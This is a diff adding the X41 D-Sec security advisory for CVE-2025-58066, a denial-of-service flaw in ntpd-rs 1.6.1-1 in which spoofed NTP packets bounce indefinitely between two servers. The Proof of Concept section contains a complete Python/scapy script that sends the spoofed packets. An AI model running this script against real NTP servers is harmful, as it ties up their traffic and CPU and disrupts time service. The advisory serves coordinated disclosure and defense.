@@ -1,0 +1,127 @@
+
+X41 D-Sec GmbH Security Advisory: X41-2025-002
+
+DoS Vulnerability in ntpd-rs
+============================
+
+Severity Rating: Medium
+
+Confirmed Affected Versions: 1.6.1-1
+
+Confirmed Patched Versions: 1.6.2
+
+Vendor: Pendulum Project
+
+Vendor URL: <https://github.com/pendulum-project/ntpd-rs>
+
+Vendor Reference: XXX
+
+Vector: Spoofed UDP packets
+
+Credit: X41 D-Sec GmbH, Eric Sesterhenn
+
+Status: Public
+
+CVE: CVE-2025-58066
+
+GitHub ID: GHSA-4855-q42w-5vr4 <https://github.com/pendulum-project/ntpd-rs/security/advisories/GHSA-4855-q42w-5vr4>
+
+YesWeHack ID: YWH-PGM10851-31
+
+CWE 400
+
+CVSS Score: 6.9
+
+CVSS Vector: CVSS:4.0/AV:N/AC:L/AT:N/PR:N/UI:N/VC:N/VI:N/VA:L/SC:N/SI:N/SA:N
+
+Advisory URL: <https://www.x41-dsec.de/lab/advisories/x41-2025-002-ntpdrs/>
+
+Summary and Impact
+==================
+
+A DoS against ntpd-rs is possible by sending spoofed packets to an ntpd-rs server, with another ntpd-rs server as the source IP address. These packets will continue to bounce between both servers indefinitely, causing traffic and CPU consumption until either one of the services is shut down.
+
+Product Description
+===================
+
+ntpd-rs is a full-featured implementation of the Network Time Protocol, including Network Time Secure (NTS) support.
+
+Analysis
+========
+
+The NTP implementation does not reject packets from privileged ports and answers to packets that have the association mode set to Server and not just to those that have it set to Client. Since the structure of the packets sent to and from the server is the same, this enables attackers to send spoofed packets from one ntpd-rs daemon to another, with the UDP source and target port set to 123. Packets will then bounce between both servers until one server is shutdown, since the answer of one server will be processed as another NTP client request by the other.
+
+Proof of Concept
+================
+
+    # cat ntpd_rs-dos.py
+    #!/usr/bin/python3
+    #
+    # DoS against ntp-rs 1.6.1-1 and below, written by eric.sesterhenn@x41-dsec.de
+    #
+    import binascii
+    import argparse
+    from scapy.all import *
+    
+    # global variables
+    debug=False
+    count = 1
+    
+    # Send packet to NTP server
+    def udpsend(source, target, data):
+        global debug
+        verbose = 1 if debug else 0
+    
+        ip = IP(src=source, dst=target)
+        udp = UDP(sport=123, dport=123)
+        pkt = ip/udp/data
+    
+        if debug:
+            pkt.show()
+        send(pkt, verbose=verbose)
+    
+    
+    ntpv4msg = binascii.unhexlify("240a03e600000000000000007f7f0101ec47e4c37c865168ec04cd98f5472b45ec47e4c5adab5aadec47e4c5adb1de90")
+    
+    # Parse arguments and set defaults
+    parser = argparse.ArgumentParser()
+    parser.add_argument("source", help="Hostname or IP of source NTP server")
+    parser.add_argument("target", help="Hostname or IP of target NTP server")
+    parser.add_argument("-d", "--debug", action="store_true")
+    parser.add_argument("-c", "--count", type=int, help="Amount of packets to send", default=1)
+    args = parser.parse_args()
+    
+    debug = args.debug
+    count = args.count
+    target = args.target
+    source = args.source
+    
+    # create list with info on whether we got a response or not
+    for i in range(count):
+        udpsend(source, target, ntpv4msg)
+    
+    
+        # swap in case spoofed packets doesnt reach one of them
+        target, source = source, target
+    print("")
+
+
+Workarounds
+===========
+
+A workaround would be to block packets from unprivileged ports to the NTP daemon at the firewall level.
+
+Timeline
+========
+
+2025-08-14 Issue identified, PoC created, vendor contacted
+
+2025-08-14 Vendor replied, YWH-PGM10851-31 and GHSA-4855-q42w-5vr4 assigned
+
+2025-08-20 Info requested by vendor to help with replicating the issue.
+
+2025-08-21 Details provided on how to replicate in docker environment.
+
+2025-08-29 Patch released, CVE assigned and GitHub Advisory published
+
+2025-09-05 X41 Advisory published due to vacation
